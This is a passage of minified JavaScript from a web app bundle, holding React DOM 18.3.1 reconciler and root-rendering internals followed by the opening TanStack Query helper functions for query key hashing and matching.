  while (!0);
  if (ff(),
    ie = n,
    il.current = r,
    Me !== null)
    throw Error(F(261));
  return Le = null,
    ze = 0,
    Ie
}
function hS() {
  for (; Me !== null;)
    gv(Me)
}
function mS() {
  for (; Me !== null && !Vb();)
    gv(Me)
}
function gv(e) {
  var t = xv(e.alternate, e, wt);
  e.memoizedProps = e.pendingProps,
    t === null ? yv(e) : Me = t,
    jf.current = null
}
function yv(e) {
  var t = e;
  do {
    var n = t.alternate;
    if (e = t.return,
      t.flags & 32768) {
      if (n = aS(n, t),
        n !== null) {
        n.flags &= 32767,
          Me = n;
        return
      }
      if (e !== null)
        e.flags |= 32768,
          e.subtreeFlags = 0,
          e.deletions = null;
      else {
        Ie = 6,
          Me = null;
        return
      }
    } else if (n = iS(n, t, wt),
      n !== null) {
      Me = n;
      return
    }
    if (t = t.sibling,
      t !== null) {
      Me = t;
      return
    }
    Me = t = e
  } while (t !== null);
  Ie === 0 && (Ie = 5)
}
function Mr(e, t, n) {
  var r = ce
    , s = Lt.transition;
  try {
    Lt.transition = null,
      ce = 1,
      pS(e, t, n, r)
  } finally {
    Lt.transition = s,
      ce = r
  }
  return null
}
function pS(e, t, n, r) {
  do
    Rs();
  while (cr !== null);
  if (ie & 6)
    throw Error(F(327));
  n = e.finishedWork;
  var s = e.finishedLanes;
  if (n === null)
    return null;
  if (e.finishedWork = null,
    e.finishedLanes = 0,
    n === e.current)
    throw Error(F(177));
  e.callbackNode = null,
    e.callbackPriority = 0;
  var o = n.lanes | n.childLanes;
  if (Kb(e, o),
    e === Le && (Me = Le = null,
      ze = 0),
    !(n.subtreeFlags & 2064) && !(n.flags & 2064) || da || (da = !0,
      wv(Ha, function () {
        return Rs(),
          null
      })),
    o = (n.flags & 15990) !== 0,
    n.subtreeFlags & 15990 || o) {
    o = Lt.transition,
      Lt.transition = null;
    var i = ce;
    ce = 1;
    var l = ie;
    ie |= 4,
      jf.current = null,
      cS(e, n),
      dv(n, e),
      I2(Uu),
      Qa = !!zu,
      Uu = zu = null,
      e.current = n,
      uS(n),
      Bb(),
      ie = l,
      ce = i,
      Lt.transition = o
  } else
    e.current = n;
  if (da && (da = !1,
    cr = e,
    ll = s),
    o = e.pendingLanes,
    o === 0 && (gr = null),
    $b(n.stateNode),
    mt(e, Te()),
    t !== null)
    for (r = e.onRecoverableError,
      n = 0; n < t.length; n++)
      s = t[n],
        r(s.value, {
          componentStack: s.stack,
          digest: s.digest
        });
  if (al)
    throw al = !1,
    e = ld,
    ld = null,
    e;
  return ll & 1 && e.tag !== 0 && Rs(),
    o = e.pendingLanes,
    o & 1 ? e === cd ? qo++ : (qo = 0,
      cd = e) : qo = 0,
    Ar(),
    null
}
function Rs() {
  if (cr !== null) {
    var e = X0(ll)
      , t = Lt.transition
      , n = ce;
    try {
      if (Lt.transition = null,
        ce = 16 > e ? 16 : e,
        cr === null)
        var r = !1;
      else {
        if (e = cr,
          cr = null,
          ll = 0,
          ie & 6)
          throw Error(F(331));
        var s = ie;
        for (ie |= 4,
          W = e.current; W !== null;) {
          var o = W
            , i = o.child;
          if (W.flags & 16) {
            var l = o.deletions;
            if (l !== null) {
              for (var c = 0; c < l.length; c++) {
                var u = l[c];
                for (W = u; W !== null;) {
                  var d = W;
                  switch (d.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Wo(8, d, o)
                  }
                  var f = d.child;
                  if (f !== null)
                    f.return = d,
                      W = f;
                  else
                    for (; W !== null;) {
                      d = W;
                      var h = d.sibling
                        , y = d.return;
                      if (lv(d),
                        d === u) {
                        W = null;
                        break
                      }
                      if (h !== null) {
                        h.return = y,
                          W = h;
                        break
                      }
                      W = y
                    }
                }
              }
              var b = o.alternate;
              if (b !== null) {
                var v = b.child;
                if (v !== null) {
                  b.child = null;
                  do {
                    var C = v.sibling;
                    v.sibling = null,
                      v = C
                  } while (v !== null)
                }
              }
              W = o
            }
          }
          if (o.subtreeFlags & 2064 && i !== null)
            i.return = o,
              W = i;
          else
            e: for (; W !== null;) {
              if (o = W,
                o.flags & 2048)
                switch (o.tag) {
                  case 0:
                  case 11:
                  case 15:
                    Wo(9, o, o.return)
                }
              var g = o.sibling;
              if (g !== null) {
                g.return = o.return,
                  W = g;
                break e
              }
              W = o.return
            }
        }
        var m = e.current;
        for (W = m; W !== null;) {
          i = W;
          var p = i.child;
          if (i.subtreeFlags & 2064 && p !== null)
            p.return = i,
              W = p;
          else
            e: for (i = m; W !== null;) {
              if (l = W,
                l.flags & 2048)
                try {
                  switch (l.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Ll(9, l)
                  }
                } catch (S) {
                  je(l, l.return, S)
                }
              if (l === i) {
                W = null;
                break e
              }
              var w = l.sibling;
              if (w !== null) {
                w.return = l.return,
                  W = w;
                break e
              }
              W = l.return
            }
        }
        if (ie = s,
          Ar(),
          hn && typeof hn.onPostCommitFiberRoot == "function")
          try {
            hn.onPostCommitFiberRoot(Tl, e)
          } catch { }
        r = !0
      }
      return r
    } finally {
      ce = n,
        Lt.transition = t
    }
  }
  return !1
}
function Hm(e, t, n) {
  t = Ys(n, t),
    t = Xy(e, t, 1),
    e = pr(e, t, 1),
    t = ot(),
    e !== null && (Di(e, 1, t),
      mt(e, t))
}
function je(e, t, n) {
  if (e.tag === 3)
    Hm(e, e, n);
  else
    for (; t !== null;) {
      if (t.tag === 3) {
        Hm(t, e, n);
        break
      } else if (t.tag === 1) {
        var r = t.stateNode;
        if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (gr === null || !gr.has(r))) {
          e = Ys(n, e),
            e = Jy(t, e, 1),
            t = pr(t, e, 1),
            e = ot(),
            t !== null && (Di(t, 1, e),
              mt(t, e));
          break
        }
      }
      t = t.return
    }
}
function gS(e, t, n) {
  var r = e.pingCache;
  r !== null && r.delete(t),
    t = ot(),
    e.pingedLanes |= e.suspendedLanes & n,
    Le === e && (ze & n) === n && (Ie === 4 || Ie === 3 && (ze & 130023424) === ze && 500 > Te() - Af ? Wr(e, 0) : Pf |= n),
    mt(e, t)
}
function vv(e, t) {
  t === 0 && (e.mode & 1 ? (t = ta,
    ta <<= 1,
    !(ta & 130023424) && (ta = 4194304)) : t = 1);
  var n = ot();
  e = Ln(e, t),
    e !== null && (Di(e, t, n),
      mt(e, n))
}
function yS(e) {
  var t = e.memoizedState
    , n = 0;
  t !== null && (n = t.retryLane),
    vv(e, n)
}
function vS(e, t) {
  var n = 0;
  switch (e.tag) {
    case 13:
      var r = e.stateNode
        , s = e.memoizedState;
      s !== null && (n = s.retryLane);
      break;
    case 19:
      r = e.stateNode;
      break;
    default:
      throw Error(F(314))
  }
  r !== null && r.delete(t),
    vv(e, n)
}
var xv;
xv = function (e, t, n) {
  if (e !== null)
    if (e.memoizedProps !== t.pendingProps || ft.current)
      ut = !0;
    else {
      if (!(e.lanes & n) && !(t.flags & 128))
        return ut = !1,
          oS(e, t, n);
      ut = !!(e.flags & 131072)
    }
  else
    ut = !1,
      ve && t.flags & 1048576 && Cy(t, Za, t.index);
  switch (t.lanes = 0,
  t.tag) {
    case 2:
      var r = t.type;
      ka(e, t),
        e = t.pendingProps;
      var s = Qs(t, Ze.current);
      Ms(t, n),
        s = wf(null, t, r, e, s, n);
      var o = bf();
      return t.flags |= 1,
        typeof s == "object" && s !== null && typeof s.render == "function" && s.$$typeof === void 0 ? (t.tag = 1,
          t.memoizedState = null,
          t.updateQueue = null,
          ht(r) ? (o = !0,
            Xa(t)) : o = !1,
          t.memoizedState = s.state !== null && s.state !== void 0 ? s.state : null,
          pf(t),
          s.updater = _l,
          t.stateNode = s,
          s._reactInternals = t,
          Xu(t, r, e, n),
          t = ed(null, t, r, !0, o, n)) : (t.tag = 0,
            ve && o && lf(t),
            tt(null, t, s, n),
            t = t.child),
        t;
    case 16:
      r = t.elementType;
      e: {
        switch (ka(e, t),
        e = t.pendingProps,
        s = r._init,
        r = s(r._payload),
        t.type = r,
        s = t.tag = wS(r),
        e = Qt(r, e),
        s) {
          case 0:
            t = Zu(null, t, r, e, n);
            break e;
          case 1:
            t = Om(null, t, r, e, n);
            break e;
          case 11:
            t = Mm(null, t, r, e, n);
            break e;
          case 14:
            t = Rm(null, t, r, Qt(r.type, e), n);
            break e
        }
        throw Error(F(306, r, ""))
      }
      return t;
    case 0:
      return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Qt(r, s),
        Zu(e, t, r, s, n);
    case 1:
      return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Qt(r, s),
        Om(e, t, r, s, n);
    case 3:
      e: {
        if (nv(t),
          e === null)
          throw Error(F(387));
        r = t.pendingProps,
          o = t.memoizedState,
          s = o.element,
          Ty(e, t),
          nl(t, r, null, n);
        var i = t.memoizedState;
        if (r = i.element,
          o.isDehydrated)
          if (o = {
            element: r,
            isDehydrated: !1,
            cache: i.cache,
            pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
            transitions: i.transitions
          },
            t.updateQueue.baseState = o,
            t.memoizedState = o,
            t.flags & 256) {
            s = Ys(Error(F(423)), t),
              t = Im(e, t, r, n, s);
            break e
          } else if (r !== s) {
            s = Ys(Error(F(424)), t),
              t = Im(e, t, r, n, s);
            break e
          } else
            for (St = mr(t.stateNode.containerInfo.firstChild),
              Ct = t,
              ve = !0,
              Yt = null,
              n = Ay(t, null, r, n),
              t.child = n; n;)
              n.flags = n.flags & -3 | 4096,
                n = n.sibling;
        else {
          if (qs(),
            r === s) {
            t = Fn(e, t, n);
            break e
          }
          tt(e, t, r, n)
        }
        t = t.child
      }
      return t;
    case 5:
      return ky(t),
        e === null && Gu(t),
        r = t.type,
        s = t.pendingProps,
        o = e !== null ? e.memoizedProps : null,
        i = s.children,
        $u(r, s) ? i = null : o !== null && $u(r, o) && (t.flags |= 32),
        tv(e, t),
        tt(e, t, i, n),
        t.child;
    case 6:
      return e === null && Gu(t),
        null;
    case 13:
      return rv(e, t, n);
    case 4:
      return gf(t, t.stateNode.containerInfo),
        r = t.pendingProps,
        e === null ? t.child = Gs(t, null, r, n) : tt(e, t, r, n),
        t.child;
    case 11:
      return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Qt(r, s),
        Mm(e, t, r, s, n);
    case 7:
      return tt(e, t, t.pendingProps, n),
        t.child;
    case 8:
      return tt(e, t, t.pendingProps.children, n),
        t.child;
    case 12:
      return tt(e, t, t.pendingProps.children, n),
        t.child;
    case 10:
      e: {
        if (r = t.type._context,
          s = t.pendingProps,
          o = t.memoizedProps,
          i = s.value,
          fe(el, r._currentValue),
          r._currentValue = i,
          o !== null)
          if (en(o.value, i)) {
            if (o.children === s.children && !ft.current) {
              t = Fn(e, t, n);
              break e
            }
          } else
            for (o = t.child,
              o !== null && (o.return = t); o !== null;) {
              var l = o.dependencies;
              if (l !== null) {
                i = o.child;
                for (var c = l.firstContext; c !== null;) {
                  if (c.context === r) {
                    if (o.tag === 1) {
                      c = Dn(-1, n & -n),
                        c.tag = 2;
                      var u = o.updateQueue;
                      if (u !== null) {
                        u = u.shared;
                        var d = u.pending;
                        d === null ? c.next = c : (c.next = d.next,
                          d.next = c),
                          u.pending = c
                      }
                    }
                    o.lanes |= n,
                      c = o.alternate,
                      c !== null && (c.lanes |= n),
                      Ku(o.return, n, t),
                      l.lanes |= n;
                    break
                  }
                  c = c.next
                }
              } else if (o.tag === 10)
                i = o.type === t.type ? null : o.child;
              else if (o.tag === 18) {
                if (i = o.return,
                  i === null)
                  throw Error(F(341));
                i.lanes |= n,
                  l = i.alternate,
                  l !== null && (l.lanes |= n),
                  Ku(i, n, t),
                  i = o.sibling
              } else
                i = o.child;
              if (i !== null)
                i.return = o;
              else
                for (i = o; i !== null;) {
                  if (i === t) {
                    i = null;
                    break
                  }
                  if (o = i.sibling,
                    o !== null) {
                    o.return = i.return,
                      i = o;
                    break
                  }
                  i = i.return
                }
              o = i
            }
        tt(e, t, s.children, n),
          t = t.child
      }
      return t;
    case 9:
      return s = t.type,
        r = t.pendingProps.children,
        Ms(t, n),
        s = Vt(s),
        r = r(s),
        t.flags |= 1,
        tt(e, t, r, n),
        t.child;
    case 14:
      return r = t.type,
        s = Qt(r, t.pendingProps),
        s = Qt(r.type, s),
        Rm(e, t, r, s, n);
    case 15:
      return Zy(e, t, t.type, t.pendingProps, n);
    case 17:
      return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Qt(r, s),
        ka(e, t),
        t.tag = 1,
        ht(r) ? (e = !0,
          Xa(t)) : e = !1,
        Ms(t, n),
        Yy(t, r, s),
        Xu(t, r, s, n),
        ed(null, t, r, !0, e, n);
    case 19:
      return sv(e, t, n);
    case 22:
      return ev(e, t, n)
  }
  throw Error(F(156, t.tag))
}
  ;
function wv(e, t) {
  return q0(e, t)
}
function xS(e, t, n, r) {
  this.tag = e,
    this.key = n,
    this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
    this.index = 0,
    this.ref = null,
    this.pendingProps = t,
    this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
    this.mode = r,
    this.subtreeFlags = this.flags = 0,
    this.deletions = null,
    this.childLanes = this.lanes = 0,
    this.alternate = null
}
function _t(e, t, n, r) {
  return new xS(e, t, n, r)
}
function Df(e) {
  return e = e.prototype,
    !(!e || !e.isReactComponent)
}
function wS(e) {
  if (typeof e == "function")
    return Df(e) ? 1 : 0;
  if (e != null) {
    if (e = e.$$typeof,
      e === Kd)
      return 11;
    if (e === Yd)
      return 14
  }
  return 2
}
function vr(e, t) {
  var n = e.alternate;
  return n === null ? (n = _t(e.tag, t, e.key, e.mode),
    n.elementType = e.elementType,
    n.type = e.type,
    n.stateNode = e.stateNode,
    n.alternate = e,
    e.alternate = n) : (n.pendingProps = t,
      n.type = e.type,
      n.flags = 0,
      n.subtreeFlags = 0,
      n.deletions = null),
    n.flags = e.flags & 14680064,
    n.childLanes = e.childLanes,
    n.lanes = e.lanes,
    n.child = e.child,
    n.memoizedProps = e.memoizedProps,
    n.memoizedState = e.memoizedState,
    n.updateQueue = e.updateQueue,
    t = e.dependencies,
    n.dependencies = t === null ? null : {
      lanes: t.lanes,
      firstContext: t.firstContext
    },
    n.sibling = e.sibling,
    n.index = e.index,
    n.ref = e.ref,
    n
}
function Ra(e, t, n, r, s, o) {
  var i = 2;
  if (r = e,
    typeof e == "function")
    Df(e) && (i = 1);
  else if (typeof e == "string")
    i = 5;
  else
    e: switch (e) {
      case fs:
        return Qr(n.children, s, o, t);
      case Gd:
        i = 8,
          s |= 8;
        break;
      case bu:
        return e = _t(12, n, t, s | 2),
          e.elementType = bu,
          e.lanes = o,
          e;
      case Su:
        return e = _t(13, n, t, s),
          e.elementType = Su,
          e.lanes = o,
          e;
      case Cu:
        return e = _t(19, n, t, s),
          e.elementType = Cu,
          e.lanes = o,
          e;
      case k0:
        return Vl(n, s, o, t);
      default:
        if (typeof e == "object" && e !== null)
          switch (e.$$typeof) {
            case E0:
              i = 10;
              break e;
            case T0:
              i = 9;
              break e;
            case Kd:
              i = 11;
              break e;
            case Yd:
              i = 14;
              break e;
            case Jn:
              i = 16,
                r = null;
              break e
          }
        throw Error(F(130, e == null ? e : typeof e, ""))
    }
  return t = _t(i, n, t, s),
    t.elementType = e,
    t.type = r,
    t.lanes = o,
    t
}
function Qr(e, t, n, r) {
  return e = _t(7, e, r, t),
    e.lanes = n,
    e
}
function Vl(e, t, n, r) {
  return e = _t(22, e, r, t),
    e.elementType = k0,
    e.lanes = n,
    e.stateNode = {
      isHidden: !1
    },
    e
}
function Uc(e, t, n) {
  return e = _t(6, e, null, t),
    e.lanes = n,
    e
}
function $c(e, t, n) {
  return t = _t(4, e.children !== null ? e.children : [], e.key, t),
    t.lanes = n,
    t.stateNode = {
      containerInfo: e.containerInfo,
      pendingChildren: null,
      implementation: e.implementation
    },
    t
}
function bS(e, t, n, r, s) {
  this.tag = t,
    this.containerInfo = e,
    this.finishedWork = this.pingCache = this.current = this.pendingChildren = null,
    this.timeoutHandle = -1,
    this.callbackNode = this.pendingContext = this.context = null,
    this.callbackPriority = 0,
    this.eventTimes = Cc(0),
    this.expirationTimes = Cc(-1),
    this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
    this.entanglements = Cc(0),
    this.identifierPrefix = r,
    this.onRecoverableError = s,
    this.mutableSourceEagerHydrationData = null
}
function Mf(e, t, n, r, s, o, i, l, c) {
  return e = new bS(e, t, n, l, c),
    t === 1 ? (t = 1,
      o === !0 && (t |= 8)) : t = 0,
    o = _t(3, null, null, t),
    e.current = o,
    o.stateNode = e,
    o.memoizedState = {
      element: r,
      isDehydrated: n,
      cache: null,
      transitions: null,
      pendingSuspenseBoundaries: null
    },
    pf(o),
    e
}
function SS(e, t, n) {
  var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
  return {
    $$typeof: ds,
    key: r == null ? null : "" + r,
    children: e,
    containerInfo: t,
    implementation: n
  }
}
function bv(e) {
  if (!e)
    return Sr;
  e = e._reactInternals;
  e: {
    if (ns(e) !== e || e.tag !== 1)
      throw Error(F(170));
    var t = e;
    do {
      switch (t.tag) {
        case 3:
          t = t.stateNode.context;
          break e;
        case 1:
          if (ht(t.type)) {
            t = t.stateNode.__reactInternalMemoizedMergedChildContext;
            break e
          }
      }
      t = t.return
    } while (t !== null);
    throw Error(F(171))
  }
  if (e.tag === 1) {
    var n = e.type;
    if (ht(n))
      return by(e, n, t)
  }
  return t
}
function Sv(e, t, n, r, s, o, i, l, c) {
  return e = Mf(n, r, !0, e, s, o, i, l, c),
    e.context = bv(null),
    n = e.current,
    r = ot(),
    s = yr(n),
    o = Dn(r, s),
    o.callback = t ?? null,
    pr(n, o, s),
    e.current.lanes = s,
    Di(e, s, r),
    mt(e, r),
    e
}
function Bl(e, t, n, r) {
  var s = t.current
    , o = ot()
    , i = yr(s);
  return n = bv(n),
    t.context === null ? t.context = n : t.pendingContext = n,
    t = Dn(o, i),
    t.payload = {
      element: e
    },
    r = r === void 0 ? null : r,
    r !== null && (t.callback = r),
    e = pr(s, t, i),
    e !== null && (Zt(e, s, i, o),
      Aa(e, s, i)),
    i
}
function ul(e) {
  if (e = e.current,
    !e.child)
    return null;
  switch (e.child.tag) {
    case 5:
      return e.child.stateNode;
    default:
      return e.child.stateNode
  }
}
function Wm(e, t) {
  if (e = e.memoizedState,
    e !== null && e.dehydrated !== null) {
    var n = e.retryLane;
    e.retryLane = n !== 0 && n < t ? n : t
  }
}
function Rf(e, t) {
  Wm(e, t),
    (e = e.alternate) && Wm(e, t)
}
function CS() {
  return null
}
var Cv = typeof reportError == "function" ? reportError : function (e) {
  console.error(e)
}
  ;
function Of(e) {
  this._internalRoot = e
}
zl.prototype.render = Of.prototype.render = function (e) {
  var t = this._internalRoot;
  if (t === null)
    throw Error(F(409));
  Bl(e, t, null, null)
}
  ;
zl.prototype.unmount = Of.prototype.unmount = function () {
  var e = this._internalRoot;
  if (e !== null) {
    this._internalRoot = null;
    var t = e.containerInfo;
    Jr(function () {
      Bl(null, e, null, null)
    }),
      t[_n] = null
  }
}
  ;
function zl(e) {
  this._internalRoot = e
}
zl.prototype.unstable_scheduleHydration = function (e) {
  if (e) {
    var t = ey();
    e = {
      blockedOn: null,
      target: e,
      priority: t
    };
    for (var n = 0; n < er.length && t !== 0 && t < er[n].priority; n++)
      ;
    er.splice(n, 0, e),
      n === 0 && ny(e)
  }
}
  ;
function If(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}
function Ul(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}
function Qm() { }
function NS(e, t, n, r, s) {
  if (s) {
    if (typeof r == "function") {
      var o = r;
      r = function () {
        var u = ul(i);
        o.call(u)
      }
    }
    var i = Sv(t, r, e, 0, null, !1, !1, "", Qm);
    return e._reactRootContainer = i,
      e[_n] = i.current,
      li(e.nodeType === 8 ? e.parentNode : e),
      Jr(),
      i
  }
  for (; s = e.lastChild;)
    e.removeChild(s);
  if (typeof r == "function") {
    var l = r;
    r = function () {
      var u = ul(c);
      l.call(u)
    }
  }
  var c = Mf(e, 0, !1, null, null, !1, !1, "", Qm);
  return e._reactRootContainer = c,
    e[_n] = c.current,
    li(e.nodeType === 8 ? e.parentNode : e),
    Jr(function () {
      Bl(t, c, n, r)
    }),
    c
}
function $l(e, t, n, r, s) {
  var o = n._reactRootContainer;
  if (o) {
    var i = o;
    if (typeof s == "function") {
      var l = s;
      s = function () {
        var c = ul(i);
        l.call(c)
      }
    }
    Bl(t, i, e, s)
  } else
    i = NS(n, t, e, s, r);
  return ul(i)
}
J0 = function (e) {
  switch (e.tag) {
    case 3:
      var t = e.stateNode;
      if (t.current.memoizedState.isDehydrated) {
        var n = Io(t.pendingLanes);
        n !== 0 && (Zd(t, n | 1),
          mt(t, Te()),
          !(ie & 6) && (Xs = Te() + 500,
            Ar()))
      }
      break;
    case 13:
      Jr(function () {
        var r = Ln(e, 1);
        if (r !== null) {
          var s = ot();
          Zt(r, e, 1, s)
        }
      }),
        Rf(e, 1)
  }
}
  ;
ef = function (e) {
  if (e.tag === 13) {
    var t = Ln(e, 134217728);
    if (t !== null) {
      var n = ot();
      Zt(t, e, 134217728, n)
    }
    Rf(e, 134217728)
  }
}
  ;
Z0 = function (e) {
  if (e.tag === 13) {
    var t = yr(e)
      , n = Ln(e, t);
    if (n !== null) {
      var r = ot();
      Zt(n, e, t, r)
    }
    Rf(e, t)
  }
}
  ;
ey = function () {
  return ce
}
  ;
ty = function (e, t) {
  var n = ce;
  try {
    return ce = e,
      t()
  } finally {
    ce = n
  }
}
  ;
Ru = function (e, t, n) {
  switch (t) {
    case "input":
      if (Pu(e, n),
        t = n.name,
        n.type === "radio" && t != null) {
        for (n = e; n.parentNode;)
          n = n.parentNode;
        for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'),
          t = 0; t < n.length; t++) {
          var r = n[t];
          if (r !== e && r.form === e.form) {
            var s = Rl(r);
            if (!s)
              throw Error(F(90));
            M0(r),
              Pu(r, s)
          }
        }
      }
      break;
    case "textarea":
      O0(e, n);
      break;
    case "select":
      t = n.value,
        t != null && Es(e, !!n.multiple, t, !1)
  }
}
  ;
z0 = Ef;
U0 = Jr;
var jS = {
  usingClientEntryPoint: !1,
  Events: [Ri, gs, Rl, V0, B0, Ef]
}
  , Po = {
    findFiberByHostInstance: _r,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
  }
  , PS = {
    bundleType: Po.bundleType,
    version: Po.version,
    rendererPackageName: Po.rendererPackageName,
    rendererConfig: Po.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: zn.ReactCurrentDispatcher,
    findHostInstanceByFiber: function (e) {
      return e = W0(e),
        e === null ? null : e.stateNode
    },
    findFiberByHostInstance: Po.findFiberByHostInstance || CS,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
  };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
  var fa = __REACT_DEVTOOLS_GLOBAL_HOOK__;
  if (!fa.isDisabled && fa.supportsFiber)
    try {
      Tl = fa.inject(PS),
        hn = fa
    } catch { }
}
Pt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = jS;
Pt.createPortal = function (e, t) {
  var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
  if (!If(t))
    throw Error(F(200));
  return SS(e, t, null, n)
}
  ;
Pt.createRoot = function (e, t) {
  if (!If(e))
    throw Error(F(299));
  var n = !1
    , r = ""
    , s = Cv;
  return t != null && (t.unstable_strictMode === !0 && (n = !0),
    t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
    t.onRecoverableError !== void 0 && (s = t.onRecoverableError)),
    t = Mf(e, 1, !1, null, null, n, !1, r, s),
    e[_n] = t.current,
    li(e.nodeType === 8 ? e.parentNode : e),
    new Of(t)
}
  ;
Pt.findDOMNode = function (e) {
  if (e == null)
    return null;
  if (e.nodeType === 1)
    return e;
  var t = e._reactInternals;
  if (t === void 0)
    throw typeof e.render == "function" ? Error(F(188)) : (e = Object.keys(e).join(","),
      Error(F(268, e)));
  return e = W0(t),
    e = e === null ? null : e.stateNode,
    e
}
  ;
Pt.flushSync = function (e) {
  return Jr(e)
}
  ;
Pt.hydrate = function (e, t, n) {
  if (!Ul(t))
    throw Error(F(200));
  return $l(null, e, t, !0, n)
}
  ;
Pt.hydrateRoot = function (e, t, n) {
  if (!If(e))
    throw Error(F(405));
  var r = n != null && n.hydratedSources || null
    , s = !1
    , o = ""
    , i = Cv;
  if (n != null && (n.unstable_strictMode === !0 && (s = !0),
    n.identifierPrefix !== void 0 && (o = n.identifierPrefix),
    n.onRecoverableError !== void 0 && (i = n.onRecoverableError)),
    t = Sv(t, null, e, 1, n ?? null, s, !1, o, i),
    e[_n] = t.current,
    li(e),
    r)
    for (e = 0; e < r.length; e++)
      n = r[e],
        s = n._getVersion,
        s = s(n._source),
        t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, s] : t.mutableSourceEagerHydrationData.push(n, s);
  return new zl(t)
}
  ;
Pt.render = function (e, t, n) {
  if (!Ul(t))
    throw Error(F(200));
  return $l(null, e, t, !1, n)
}
  ;
Pt.unmountComponentAtNode = function (e) {
  if (!Ul(e))
    throw Error(F(40));
  return e._reactRootContainer ? (Jr(function () {
    $l(null, null, e, !1, function () {
      e._reactRootContainer = null,
        e[_n] = null
    })
  }),
    !0) : !1
}
  ;
Pt.unstable_batchedUpdates = Ef;
Pt.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!Ul(n))
    throw Error(F(200));
  if (e == null || e._reactInternals === void 0)
    throw Error(F(38));
  return $l(e, t, n, !1, r)
}
  ;
Pt.version = "18.3.1-next-f1338f8080-20240426";
function Nv() {
  if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
    try {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Nv)
    } catch (e) {
      console.error(e)
    }
}
Nv(),
  N0.exports = Pt;
var Hl = N0.exports;
const AS = f0(Hl);
var jv, qm = Hl;
jv = qm.createRoot,
  qm.hydrateRoot;
var Wl = class {
  constructor() {
    this.listeners = new Set,
      this.subscribe = this.subscribe.bind(this)
  }
  subscribe(e) {
    return this.listeners.add(e),
      this.onSubscribe(),
      () => {
        this.listeners.delete(e),
          this.onUnsubscribe()
      }
  }
  hasListeners() {
    return this.listeners.size > 0
  }
  onSubscribe() { }
  onUnsubscribe() { }
}
  , Ql = typeof window > "u" || "Deno" in globalThis;
function qt() { }
function ES(e, t) {
  return typeof e == "function" ? e(t) : e
}
function TS(e) {
  return typeof e == "number" && e >= 0 && e !== 1 / 0
}
function kS(e, t) {
  return Math.max(e + (t || 0) - Date.now(), 0)
}
function Gm(e, t) {
  return typeof e == "function" ? e(t) : e
}
function DS(e, t) {
  return typeof e == "function" ? e(t) : e
}
function Km(e, t) {
  const { type: n = "all", exact: r, fetchStatus: s, predicate: o, queryKey: i, stale: l } = e;
  if (i) {
    if (r) {
      if (t.queryHash !== _f(i, t.options))
        return !1
    } else if (!vi(t.queryKey, i))
      return !1
  }
  if (n !== "all") {
    const c = t.isActive();
    if (n === "active" && !c || n === "inactive" && c)
      return !1
  }
  return !(typeof l == "boolean" && t.isStale() !== l || s && s !== t.state.fetchStatus || o && !o(t))
}
function Ym(e, t) {
  const { exact: n, status: r, predicate: s, mutationKey: o } = e;
  if (o) {
    if (!t.options.mutationKey)
      return !1;
    if (n) {
      if (yi(t.options.mutationKey) !== yi(o))
        return !1
    } else if (!vi(t.options.mutationKey, o))
      return !1
  }
  return !(r && t.state.status !== r || s && !s(t))
}
function _f(e, t) {
  return ((t == null ? void 0 : t.queryKeyHashFn) || yi)(e)
}
function yi(e) {
  return JSON.stringify(e, (t, n) => fd(n) ? Object.keys(n).sort().reduce((r, s) => (r[s] = n[s],
    r), {}) : n)
}
function vi(e, t) {
  return e === t ? !0 : typeof e != typeof t ? !1 : e && t && typeof e == "object" && typeof t == "object" ? !Object.keys(t).some(n => !vi(e[n], t[n])) : !1
}
function Pv(e, t) {
  if (e === t)
    return e;
  const n = Xm(e) && Xm(t);
  if (n || fd(e) && fd(t)) {
    const r = n ? e : Object.keys(e)
      , s = r.length
      , o = n ? t : Object.keys(t)
      , i = o.length
      , l = n ? [] : {};
    let c = 0;
    for (let u = 0; u < i; u++) {
      const d = n ? u : o[u];
      (!n && r.includes(d) || n) && e[d] === void 0 && t[d] === void 0 ? (l[d] = void 0,
        c++) : (l[d] = Pv(e[d], t[d]),
          l[d] === e[d] && e[d] !== void 0 && c++)
    }
    return s === i && c === s ? e : l
  }
  return t
}
function Xm(e) {
  return Array.isArray(e) && e.length === Object.keys(e).length
}
function fd(e) {
  if (!Jm(e))
    return !1;
  const t = e.constructor;
  if (t === void 0)
    return !0;
  const n = t.prototype;
  return !(!Jm(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype)
}
function Jm(e) {
